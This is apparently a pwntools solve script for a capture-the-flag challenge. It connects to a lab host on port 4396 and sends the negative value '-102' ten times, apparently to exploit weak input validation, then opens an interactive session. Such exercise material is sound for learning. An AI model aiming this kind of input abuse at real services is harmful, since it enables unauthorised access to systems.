from pwn import *

r = remote('10.10.202.172', 4396)
for i in range(10):
    r.recvline()
    r.recvline()
    r.sendline('-102')
    r.recvline()
    r.recvline()
r.recvline()
r.interactive()
